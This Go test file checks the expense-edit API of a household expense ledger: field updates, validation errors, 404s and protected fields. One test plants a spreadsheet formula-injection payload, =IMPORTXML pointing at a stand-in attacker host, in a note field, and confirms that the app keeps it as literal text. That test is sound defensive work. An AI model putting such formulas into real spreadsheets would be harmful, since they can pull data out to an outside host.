package expenses_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"reflect"
	"testing"

	"github.com/nayan9229/ExpenseManager/pkg/ledger"
)

const storedID = "0b8a3c2e-5f4d-4e61-8a9b-7c6d5e4f3a21"

// storedExpense is Ramesh's ₹450 of medicines, logged yesterday evening.
func storedExpense() ledger.Expense {
	return ledger.Expense{
		ID: storedID, CreatedAt: "2026-10-30T20:00:00+05:30", UpdatedAt: "2026-10-30T20:00:00+05:30",
		ExpenseDate: "2026-10-30", LoggedBy: "ramesh", PaidBy: "ramesh", Amount: 450, Currency: "INR",
		Category: "Medical & Pharmacy", MerchantNote: "medicines for Papa", PaymentMethod: ledger.Cash,
		DriveFileID: "drive-1", DriveViewURL: "https://drive.example/1", FileHash: "hash-1",
		Reimbursement: ledger.ReimbursementNone, Status: ledger.StatusActive,
	}
}

// send makes a paired request with a JSON body (or none when body is nil).
func send(t *testing.T, f fixture, method, query string, body any) (int, map[string]any, string) {
	t.Helper()
	var reader *bytes.Reader
	switch b := body.(type) {
	case nil:
		reader = bytes.NewReader(nil)
	case string:
		reader = bytes.NewReader([]byte(b))
	default:
		raw, _ := json.Marshal(b)
		reader = bytes.NewReader(raw)
	}
	req, _ := http.NewRequest(method, f.srv.URL+"/api/expenses"+query, reader)
	req.Header.Set("Content-Type", "application/json")
	req.AddCookie(pairedCookie(t))
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	return decode(t, res)
}

// fullEdit is what the edit screen sends: the ID and every editable field.
func fullEdit() map[string]any {
	return map[string]any{
		"id":                  storedID,
		"expenseDate":         "2026-10-29",
		"paidBy":              "kid1",
		"amount":              540.5,
		"category":            "groceries & vegetables",
		"merchantNote":        "vegetables, not medicines",
		"paymentMethod":       "UPI",
		"reimbursementStatus": "pending",
	}
}

func TestAnEditRewritesTheEditableFieldsAndStampsUpdatedAt(t *testing.T) {
	f := newFixture(t)
	f.ledger.Seed(ledger.Expenses, row("other", "2026-10-28", "2026-10-28T10:00:00+05:30", ledger.StatusActive), storedExpense().Row())

	status, body, raw := send(t, f, http.MethodPut, "", fullEdit())

	if status != http.StatusOK {
		t.Fatalf("status = %d body = %s, want 200", status, raw)
	}
	wantRow := []string{
		storedID, "2026-10-30T20:00:00+05:30", "2026-10-31T09:15:00+05:30", "2026-10-29", "ramesh", "kid1",
		"540.5", "INR", "Groceries & Vegetables", "vegetables, not medicines", "UPI", "drive-1", "https://drive.example/1", "hash-1",
		"pending", "active",
	}
	rows := f.ledger.Tab(ledger.Expenses).Rows
	if len(rows) != 2 || !reflect.DeepEqual(rows[1], wantRow) {
		t.Errorf("Expenses tab = %q\nwant row 2 = %q", rows, wantRow)
	}
	if !reflect.DeepEqual(rows[0], row("other", "2026-10-28", "2026-10-28T10:00:00+05:30", ledger.StatusActive)) {
		t.Errorf("another row changed: %q", rows[0])
	}
	want := map[string]any{
		"id": storedID, "createdAt": "2026-10-30T20:00:00+05:30", "updatedAt": "2026-10-31T09:15:00+05:30",
		"expenseDate": "2026-10-29", "loggedBy": "ramesh", "paidBy": "kid1", "amount": 540.5, "currency": "INR",
		"category": "Groceries & Vegetables", "merchantNote": "vegetables, not medicines", "paymentMethod": "UPI",
		"driveFileId": "drive-1", "driveViewUrl": "https://drive.example/1", "fileHash": "hash-1",
		"reimbursementStatus": "pending", "status": "active",
	}
	if !reflect.DeepEqual(body, want) {
		t.Errorf("body = %v\nwant   %v", body, want)
	}
}

func TestAnEditOfAnUnknownOrDeletedExpenseIs404AndWritesNothing(t *testing.T) {
	deleted := storedExpense()
	deleted.Status = ledger.StatusDeleted
	cases := []struct {
		name string
		rows [][]string
		id   string
	}{
		{"unknown ID", [][]string{storedExpense().Row()}, "9d1e4c55-0000-4000-8000-000000000000"},
		{"missing ID", [][]string{storedExpense().Row()}, ""},
		{"deleted Expense", [][]string{deleted.Row()}, storedID},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newFixture(t)
			f.ledger.Seed(ledger.Expenses, c.rows...)
			before := f.ledger.Dump()
			req := fullEdit()
			req["id"] = c.id

			status, body, raw := send(t, f, http.MethodPut, "", req)

			if status != http.StatusNotFound || body["code"] != "EXPENSE_NOT_FOUND" {
				t.Fatalf("status = %d body = %s, want 404 EXPENSE_NOT_FOUND", status, raw)
			}
			if !reflect.DeepEqual(f.ledger.Dump(), before) {
				t.Errorf("the Ledger changed on a 404")
			}
		})
	}
}

func TestAnInvalidEditIsRejectedAndTheRowIsUntouched(t *testing.T) {
	cases := []struct {
		name   string
		change func(map[string]any)
		code   string
	}{
		{"zero amount", func(r map[string]any) { r["amount"] = 0 }, "INVALID_AMOUNT"},
		{"over one crore", func(r map[string]any) { r["amount"] = 10000000.01 }, "INVALID_AMOUNT"},
		{"three decimals", func(r map[string]any) { r["amount"] = 1.005 }, "INVALID_AMOUNT"},
		{"unknown Category", func(r map[string]any) { r["category"] = "Fireworks" }, "UNKNOWN_CATEGORY"},
		{"Payment Method outside the enum", func(r map[string]any) { r["paymentMethod"] = "Cheque" }, "INVALID_PAYMENT_METHOD"},
		{"two days ahead", func(r map[string]any) { r["expenseDate"] = "2026-11-02" }, "INVALID_DATE"},
		{"not a date", func(r map[string]any) { r["expenseDate"] = "29/10/2026" }, "INVALID_DATE"},
		{"unknown Paid_By", func(r map[string]any) { r["paidBy"] = "stranger" }, "UNKNOWN_MEMBER"},
		{"unknown Reimbursement", func(r map[string]any) { r["reimbursementStatus"] = "maybe" }, "INVALID_REIMBURSEMENT"},
		{"note too long", func(r map[string]any) { r["merchantNote"] = string(bytes.Repeat([]byte("a"), 501)) }, "INVALID_NOTE"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newFixture(t)
			f.ledger.Seed(ledger.Expenses, storedExpense().Row())
			before := f.ledger.Dump()
			req := fullEdit()
			c.change(req)

			status, body, raw := send(t, f, http.MethodPut, "", req)

			if status != http.StatusUnprocessableEntity || body["code"] != c.code {
				t.Fatalf("status = %d body = %s, want 422 %s", status, raw, c.code)
			}
			if !reflect.DeepEqual(f.ledger.Dump(), before) {
				t.Errorf("the Ledger changed on a rejected edit")
			}
		})
	}
}

func TestAnEditCanSendOnlyTheFieldsItChanges(t *testing.T) {
	f := newFixture(t)
	f.ledger.Seed(ledger.Expenses, storedExpense().Row())

	status, body, raw := send(t, f, http.MethodPut, "", map[string]any{"id": storedID, "reimbursementStatus": "done"})

	if status != http.StatusOK {
		t.Fatalf("status = %d body = %s, want 200", status, raw)
	}
	want := storedExpense()
	want.Reimbursement = ledger.ReimbursementDone
	want.UpdatedAt = "2026-10-31T09:15:00+05:30"
	if rows := f.ledger.Tab(ledger.Expenses).Rows; !reflect.DeepEqual(rows, [][]string{want.Row()}) {
		t.Errorf("Expenses tab = %q\nwant           %q", rows, [][]string{want.Row()})
	}
	if body["reimbursementStatus"] != "done" || body["amount"] != 450.0 || body["merchantNote"] != "medicines for Papa" {
		t.Errorf("body = %v, want only the Reimbursement changed", body)
	}
}

// An Expense from before a Category was renamed, by a Member who has since
// left, dated long ago: fixing its note must not trip over the rest.
func TestUnchangedValuesThatNoLongerValidateAreKept(t *testing.T) {
	f := newFixture(t)
	old := storedExpense()
	old.Category = "Petrol"
	old.PaidBy = "dada"
	old.LoggedBy = "dada"
	f.ledger.Seed(ledger.Expenses, old.Row())
	req := fullEdit()
	req["category"] = "Petrol"
	req["paidBy"] = "dada"
	req["merchantNote"] = "fuel for the scooter"

	status, body, raw := send(t, f, http.MethodPut, "", req)

	if status != http.StatusOK {
		t.Fatalf("status = %d body = %s, want 200", status, raw)
	}
	if body["category"] != "Petrol" || body["paidBy"] != "dada" || body["loggedBy"] != "dada" || body["merchantNote"] != "fuel for the scooter" {
		t.Errorf("body = %v, want the stale Category and payer kept and the note changed", body)
	}
}

func TestLoggedByAndTheReceiptCannotBeEdited(t *testing.T) {
	f := newFixture(t)
	f.ledger.Seed(ledger.Expenses, storedExpense().Row())
	req := fullEdit()
	req["loggedBy"] = "admin"
	req["driveFileId"] = "someone-elses-file"
	req["status"] = "deleted"
	req["createdAt"] = "2020-01-01T00:00:00+05:30"

	status, body, raw := send(t, f, http.MethodPut, "", req)

	if status != http.StatusOK {
		t.Fatalf("status = %d body = %s, want 200", status, raw)
	}
	for key, want := range map[string]any{"loggedBy": "ramesh", "driveFileId": "drive-1", "status": "active", "createdAt": "2026-10-30T20:00:00+05:30"} {
		if body[key] != want {
			t.Errorf("%s = %v, want %v (not editable)", key, body[key], want)
		}
	}
}

func TestAnEditedFormulaNoteIsReadBackAsText(t *testing.T) {
	f := newFixture(t)
	f.ledger.Seed(ledger.Expenses, storedExpense().Row())
	req := fullEdit()
	req["merchantNote"] = `=IMPORTXML("https://evil.example","//a")`

	if status, _, raw := send(t, f, http.MethodPut, "", req); status != http.StatusOK {
		t.Fatalf("status = %d body = %s, want 200", status, raw)
	}
	model, _ := readModel(t, f)

	got := list(t, model, "expenses")
	if len(got) != 1 || got[0]["merchantNote"] != `=IMPORTXML("https://evil.example","//a")` {
		t.Errorf("expenses = %v, want the edited note as literal text", got)
	}
}

func TestAnUnreadableEditBodyIsABadRequest(t *testing.T) {
	for _, body := range []string{"", "not json", `{"amount":"450"}`, `[1,2]`} {
		f := newFixture(t)
		f.ledger.Seed(ledger.Expenses, storedExpense().Row())

		status, decoded, raw := send(t, f, http.MethodPut, "", body)

		if status != http.StatusBadRequest || decoded["code"] != "BAD_REQUEST" {
			t.Errorf("body %q: status = %d %s, want 400 BAD_REQUEST", body, status, raw)
		}
	}
}
